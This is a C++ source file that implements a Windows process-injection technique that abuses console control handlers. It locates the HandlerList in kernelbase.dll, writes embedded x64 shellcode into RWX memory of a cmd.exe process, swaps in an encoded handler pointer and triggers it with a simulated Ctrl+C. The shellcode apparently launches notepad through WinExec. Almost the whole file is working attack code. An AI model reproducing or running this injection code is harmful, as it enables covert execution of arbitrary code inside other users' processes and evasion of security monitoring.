/*
* 稳妥期间，我使用了内置的cmd字符串，但是也不一定能执行，大概率可以执行shellcode
*/

#include <iostream>
#include <Windows.h>

#include <tlhelp32.h>

#include <DbgHelp.h>

#include <Psapi.h>
#include < shlwapi.h >

#include "ntStructs.h"
#include "utils.h"

// #include "ntlib_modexp/util.h"

/*
BOOL IsHeapPtr(LPVOID ptr) {
	MEMORY_BASIC_INFORMATION mbi;
	DWORD                    res;

	if (ptr == NULL) return FALSE;

	// query the pointer
	res = VirtualQuery(ptr, &mbi, sizeof(mbi));
	if (res != sizeof(mbi)) return FALSE;

	return ((mbi.State == MEM_COMMIT) &&
		(mbi.Type == MEM_PRIVATE) &&
		(mbi.Protect == PAGE_READWRITE));
}
BOOL IsCodePtrEx(HANDLE hp, LPVOID ptr) {
	MEMORY_BASIC_INFORMATION mbi;
	DWORD                    res;

	if (ptr == NULL) return FALSE;

	// query the pointer
	res = VirtualQueryEx(hp, ptr, &mbi, sizeof(mbi));
	if (res != sizeof(mbi)) return FALSE;

	return ((mbi.State == MEM_COMMIT) &&
		(mbi.Type == MEM_IMAGE) &&
		(mbi.Protect == PAGE_EXECUTE_READ));
}
PWCHAR addr2sym(HANDLE hp, LPVOID addr) 
{
	WCHAR        path[MAX_PATH];
	BYTE         buf[sizeof(SYMBOL_INFO) + MAX_SYM_NAME * sizeof(WCHAR)];
	PSYMBOL_INFO si = (PSYMBOL_INFO)buf;
	static WCHAR name[MAX_PATH];

	ZeroMemory(path, ARRAYSIZE(path));
	ZeroMemory(name, ARRAYSIZE(name));

	GetMappedFileNameW(
		hp, addr, path, MAX_PATH);

	PathStripPathW(path);

	si->SizeOfStruct = sizeof(SYMBOL_INFO);
	si->MaxNameLen = MAX_SYM_NAME;

	if (SymFromAddr(hp, (DWORD64)addr, NULL, si)) {
		wsprintfW(name, L"%s!%hs", path, si->Name);
	}
	else {
		lstrcpyW(name, path);
	}
	return name;
}
PWCHAR pid2name(DWORD pid) {
	HANDLE         hSnap;
	BOOL           bResult;
	PROCESSENTRY32W pe32;
	PWCHAR         name = NULL;

	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnap != INVALID_HANDLE_VALUE) {
		pe32.dwSize = sizeof(PROCESSENTRY32);

		bResult = Process32FirstW(hSnap, &pe32);
		while (bResult) {
			if (pe32.th32ProcessID == pid) {
				name = pe32.szExeFile;
				break;
			}
			bResult = Process32NextW(hSnap, &pe32);
		}
		CloseHandle(hSnap);
	}
	return name;
}
DWORD name2pid(LPWSTR ImageName)
{
	HANDLE         hSnap;
	PROCESSENTRY32W pe32;
	DWORD          dwPid = 0;

	// create snapshot of system
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	// get first process
	if (Process32FirstW(hSnap, &pe32)) {
		do {
			if (lstrcmpiW(ImageName, pe32.szExeFile) == 0) {
				dwPid = pe32.th32ProcessID;
				break;
			}
		} while (Process32NextW(hSnap, &pe32));
	}
	CloseHandle(hSnap);
	return dwPid;
}
BOOL SetPrivilege(PWCHAR szPrivilege, BOOL bEnable) {
	HANDLE           hToken;
	BOOL             bResult;
	LUID             luid;
	TOKEN_PRIVILEGES tp;

	// open token for current process
	bResult = OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES, &hToken);

	if (!bResult)return FALSE;

	// lookup privilege
	bResult = LookupPrivilegeValueW(NULL, szPrivilege, &luid);

	if (bResult) {
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;

		// adjust token
		bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
	}
	CloseHandle(hToken);
	return bResult;
}

*/

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType) {
	switch (dwCtrlType) {
	case CTRL_C_EVENT:
		return TRUE;
	default:
		return FALSE;
	}
}

// locate the virtual address of HandlerList in kernelbase.dll
LPVOID GetHandlerListVA(VOID) {
	PIMAGE_DOS_HEADER     dos;
	PIMAGE_NT_HEADERS     nt;
	PIMAGE_SECTION_HEADER sh;
	DWORD                 i, j, cnt;
	PULONG_PTR            ds;
	PHANDLER_ROUTINE* HandlerList;
	HMODULE               m;
	LPVOID                ptr, va = NULL;

	// set handler
	SetConsoleCtrlHandler(HandlerRoutine, TRUE);

	m = GetModuleHandleW(L"kernelbase.dll");
	dos = (PIMAGE_DOS_HEADER)m;
	nt = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);
	sh = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader +
		nt->FileHeader.SizeOfOptionalHeader);

	// locate the .data segment, save VA and number of pointers
	for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
		if (*(PDWORD)sh[i].Name == *(PDWORD)".data") {
			ds = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
			cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
			break;
		}
	}

	// for each pointer
	for (i = 0; i < cnt; i++) {
		// if not heap pointer, skip it
		if (!IsHeapPtr((LPVOID)ds[i])) continue;
		// assume this is the HandlerList array
		HandlerList = (PHANDLER_ROUTINE*)ds[i];
		// decode second pointer in list
		ptr = DecodePointer((LPVOID)HandlerList[1]);
		// is it our handler?
		if (ptr == HandlerRoutine) {
			// save virtual address and exit loop
			va = &ds[i];
			break;
		}
	}
	// remove handler
	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
	return va;
}

VOID ctrl_list(DWORD pid)
{
	PROCESSENTRY32          pe;
	HANDLE                  ss, hp;
	PHANDLER_ROUTINE* HandlerList, Handler;
	SIZE_T                  rd;
	LPVOID                  hl_va, ptr;
	DWORD                   i;
	HRESULT                 res;
	_RtlDecodeRemotePointer RtlDecodeRemotePointer;

	hl_va = GetHandlerListVA();

	if (hl_va == NULL) {
		wprintf(L"WARNING: Unable to resolve address of HandlerList\n");
		return;
	}

	RtlDecodeRemotePointer = (_RtlDecodeRemotePointer)
		GetProcAddress(GetModuleHandleW(L"ntdll"), "RtlDecodeRemotePointer");

	ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (ss == INVALID_HANDLE_VALUE) return;

	pe.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(ss, &pe)) {
		do {
			if (pid != 0 && pe.th32ProcessID != pid) continue;

			hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
			if (hp != NULL) {
				SymInitialize(hp, NULL, TRUE);

				// read the heap pointer from remote process
				ReadProcessMemory(hp, hl_va, &HandlerList, sizeof(ULONG_PTR), &rd);

				printf("\nHandlerList: %p for %04i : %s\n",
					(LPVOID)HandlerList, pe.th32ProcessID, pe.szExeFile);

				// read each pointer
				for (i = 0;; i++) {
					ptr = (PBYTE)HandlerList + (i * sizeof(ULONG_PTR));
					ReadProcessMemory(hp, ptr, &ptr, sizeof(ULONG_PTR), &rd);
					RtlDecodeRemotePointer(hp, ptr, (PVOID*)&Handler);
					if (!IsCodePtrEx(hp, Handler)) break;
					printf("%p : %ws\n", Handler, addr2sym(hp, Handler));
				}
				SymCleanup(hp);
				CloseHandle(hp);
			}
		} while (Process32Next(ss, &pe));
	}
	CloseHandle(ss);
}

// simulate CTRL+C
void SendCtrlC(HWND hWnd) {
	INPUT ip;

	SetForegroundWindow(hWnd);

	ip.type = INPUT_KEYBOARD;
	ip.ki.wScan = 0;
	ip.ki.time = 0;
	ip.ki.dwExtraInfo = 0;

	ip.ki.wVk = VK_CONTROL;
	ip.ki.dwFlags = 0;
	SendInput(1, &ip, sizeof(INPUT));

	ip.ki.wVk = 'C';
	ip.ki.dwFlags = 0;
	SendInput(1, &ip, sizeof(INPUT));

	ip.ki.wVk = 'C';
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));

	ip.ki.wVk = VK_CONTROL;
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));

	Sleep(1000);
}

void ctrl_inject(DWORD pid, LPVOID payload, DWORD payloadSize) 
{
	HANDLE                  hp;
	SIZE_T                  rd, wr;
	DWORD                   i, id;
	HWND                    hw = NULL;
	PHANDLER_ROUTINE* HandlerList, Handler;
	LPVOID                  hl_va, heap_ptr, enc_ptr, last_ptr, cs;
	_RtlDecodeRemotePointer RtlDecodeRemotePointer;
	_RtlEncodeRemotePointer RtlEncodeRemotePointer;

	// 1. Resolve virtual address of HandlerList and function encoders
	for (;;) 
	{
		hw = FindWindowExW(NULL, hw, L"ConsoleWindowClass", NULL);
		if (hw == NULL) {
			printf("FindWindowExW (ConsoleWindowClass) failed\n");
			break;
		}

		GetWindowThreadProcessId(hw, &id);
		if (id == pid) break;
	}

	hl_va = GetHandlerListVA();

	RtlDecodeRemotePointer = (_RtlDecodeRemotePointer)
		GetProcAddress(GetModuleHandleW(L"ntdll"),
			"RtlDecodeRemotePointer");

	RtlEncodeRemotePointer = (_RtlEncodeRemotePointer)
		GetProcAddress(GetModuleHandleW(L"ntdll"),
			"RtlEncodeRemotePointer");

	if (hw == 0 ||
		hl_va == NULL ||
		RtlDecodeRemotePointer == NULL ||
		RtlDecodeRemotePointer == NULL)
	{
		return;
	}

	// 2. Open process for read,write and allocate operations
	hp = OpenProcess(
		PROCESS_VM_OPERATION |
		PROCESS_VM_READ |
		PROCESS_VM_WRITE,
		FALSE,
		pid);

	if (hp == NULL)
	{
		printf("open process failed \n");
		return;
	}

	// 3. Read the heap pointer from remote process
	ReadProcessMemory(hp, hl_va,
		&HandlerList, sizeof(ULONG_PTR), &rd);

	// read each pointer to find last one in list
	for (last_ptr = NULL, i = 0;; i++) 
	{
		heap_ptr = (PBYTE)HandlerList + (i * sizeof(ULONG_PTR));

		// read encoded pointer
		ReadProcessMemory(hp, heap_ptr, &enc_ptr, sizeof(ULONG_PTR), &rd);

		// decode it
		RtlDecodeRemotePointer(hp, enc_ptr, (PVOID*)&Handler);

		// if this doesn't point to code in remote process, exit loop
		if (!IsCodePtrEx(hp, Handler)) break;

		// save heap address of this handler
		last_ptr = heap_ptr;
	}

	// if we have a heap address of handler
	if (last_ptr != NULL) 
	{
		// backup existing encoded handler
		ReadProcessMemory(hp, last_ptr,
			&enc_ptr, sizeof(ULONG_PTR), &rd);

		// allocate RWX memory in remote process
		cs = VirtualAllocEx(
			hp,
			NULL,
			payloadSize,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE);

		if (cs != NULL) 
		{
			// write payload
			WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
			printf("shellcode wpm %p\n", cs);

			// encode pointer to payload
			RtlEncodeRemotePointer(hp, cs, (PVOID*)&Handler);

			// overwrite pointer in HandlerList for remote process
			WriteProcessMemory(hp, last_ptr,
				&Handler, sizeof(PHANDLER_ROUTINE), &wr);

			// execute
			SendCtrlC(hw);

			// restore original function
			WriteProcessMemory(hp, last_ptr,
				&enc_ptr, sizeof(PHANDLER_ROUTINE), &wr);

			VirtualFreeEx(hp, cs, 0, MEM_RELEASE);
		}
	}
	CloseHandle(hp);
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	WCHAR cls[MAX_PATH];

	GetClassNameW(hwnd, cls, MAX_PATH);
	printf("%p : %ws\n", (LPVOID)hwnd, cls);
	return TRUE;
}

BOOL CALLBACK EnumThreadWndProc(HWND hwnd, LPARAM lParam) {
	WCHAR cls[MAX_PATH];

	GetClassNameW(hwnd, cls, MAX_PATH);
	printf("%p : %ws\n", (LPVOID)hwnd, cls);

	EnumChildWindows(hwnd, EnumChildProc, lParam);
	return TRUE;
}

VOID EnumProcessWindows(DWORD pid) {
	DWORD         i, cnt = 0;
	HANDLE        ss;
	THREADENTRY32 te;

	// create snapshot of system
	ss = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (ss == INVALID_HANDLE_VALUE) return;

	// gather list of threads
	te.dwSize = sizeof(THREADENTRY32);

	if (Thread32First(ss, &te)) {
		do {
			// if not our target process, skip it
			if (pid != 0 && te.th32OwnerProcessID != pid) continue;

			EnumThreadWindows(te.th32ThreadID, EnumThreadWndProc, 0);
		} while (Thread32Next(ss, &te));
	}
	CloseHandle(ss);
}

VOID ListConsoles(VOID) 
{
	DWORD  i, cnt = 0;
	PDWORD list;

	cnt = GetConsoleProcessList(&cnt, 1);

	list = (PDWORD)malloc(cnt * sizeof(DWORD));
	if (list != NULL) {
		GetConsoleProcessList(list, cnt);

		for (i = 0; i < cnt; i++) {
			printf("%s : %i\n", pid2name(list[i]), list[i]);
		}
		free(list);
	}
}

int ctrlinjectExecute()
{
	DWORD  pid = 0;
	SIZE_T len;
	unsigned char shellcode2[344] = {
		0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8D, 0x48, 0xD8, 0xC7, 0x40, 0xD8, 0x57, 0x69,
		0x6E, 0x45, 0xC7, 0x40, 0xDC, 0x78, 0x65, 0x63, 0x00, 0xC7, 0x40, 0xE0, 0x6E, 0x6F, 0x74, 0x65,
		0xC7, 0x40, 0xE4, 0x70, 0x61, 0x64, 0x00, 0xE8, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74,
		0x0C, 0xBA, 0x05, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x28, 0xFF, 0xD0, 0x33, 0xC0, 0x48,
		0x83, 0xC4, 0x48, 0xC3, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
		0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC,
		0x20, 0x48, 0x63, 0x41, 0x3C, 0x48, 0x8B, 0xD9, 0x4C, 0x8B, 0xE2, 0x8B, 0x8C, 0x08, 0x88, 0x00,
		0x00, 0x00, 0x85, 0xC9, 0x74, 0x37, 0x48, 0x8D, 0x04, 0x0B, 0x8B, 0x78, 0x18, 0x85, 0xFF, 0x74,
		0x2C, 0x8B, 0x70, 0x1C, 0x44, 0x8B, 0x70, 0x20, 0x48, 0x03, 0xF3, 0x8B, 0x68, 0x24, 0x4C, 0x03,
		0xF3, 0x48, 0x03, 0xEB, 0xFF, 0xCF, 0x49, 0x8B, 0xCC, 0x41, 0x8B, 0x14, 0xBE, 0x48, 0x03, 0xD3,
		0xE8, 0x87, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x25, 0x85, 0xFF, 0x75, 0xE7, 0x33, 0xC0, 0x48,
		0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x8B,
		0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5C, 0xC3, 0x0F, 0xB7,
		0x44, 0x7D, 0x00, 0x8B, 0x04, 0x86, 0x48, 0x03, 0xC3, 0xEB, 0xD4, 0xCC, 0x48, 0x89, 0x5C, 0x24,
		0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48,
		0x8B, 0xF9, 0x45, 0x33, 0xC0, 0x48, 0x8B, 0x50, 0x18, 0x48, 0x8B, 0x5A, 0x10, 0xEB, 0x16, 0x4D,
		0x85, 0xC0, 0x75, 0x1A, 0x48, 0x8B, 0xD7, 0x48, 0x8B, 0xC8, 0xE8, 0x35, 0xFF, 0xFF, 0xFF, 0x48,
		0x8B, 0x1B, 0x4C, 0x8B, 0xC0, 0x48, 0x8B, 0x43, 0x30, 0x48, 0x85, 0xC0, 0x75, 0xE1, 0x48, 0x8B,
		0x5C, 0x24, 0x30, 0x49, 0x8B, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x44, 0x8A, 0x01, 0x45,
		0x84, 0xC0, 0x74, 0x1A, 0x41, 0x8A, 0xC0, 0x48, 0x2B, 0xCA, 0x44, 0x8A, 0xC0, 0x3A, 0x02, 0x75,
		0x0D, 0x48, 0xFF, 0xC2, 0x8A, 0x04, 0x11, 0x44, 0x8A, 0xC0, 0x84, 0xC0, 0x75, 0xEC, 0x0F, 0xB6,
		0x0A, 0x41, 0x0F, 0xB6, 0xC0, 0x2B, 0xC1, 0xC3
	};
	ListConsoles();

	SetPrivilege((PWCHAR)SE_DEBUG_NAME, TRUE);
	SymSetOptions(SYMOPT_DEFERRED_LOADS);

	pid = name2pid((LPWSTR)L"cmd.exe");

	if (pid == 0)
	{
		printf("find no notepad.exe process \n");
		return 0;
	}

	ctrl_list(pid);


	ctrl_inject(pid, shellcode2, sizeof(shellcode2));

	return 0;
}

